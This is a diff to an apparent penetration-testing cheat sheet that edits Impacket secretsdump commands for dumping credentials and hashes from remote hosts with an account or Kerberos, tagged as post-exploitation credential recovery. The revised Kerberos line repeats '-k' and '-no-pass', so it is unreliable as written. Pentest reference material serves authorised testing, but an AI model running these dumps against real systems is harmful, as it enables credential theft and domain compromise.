@@ -5,13 +5,13 @@
 ## dump with account
 #plateform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump.py ''<domain>/<user>:<password>''@<ip>
+secretsdump.py '<domain>/<user>:<password>'@<ip>
 ```
 
 ## dump with kerberos
 #plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
-secretsdump -k <dc_name>
+secretsdump -k -k -no-pass -dc-ip <dc_ip> -no-pass -k <target_name>
 ```
 
 ## extract hash from sam dump files
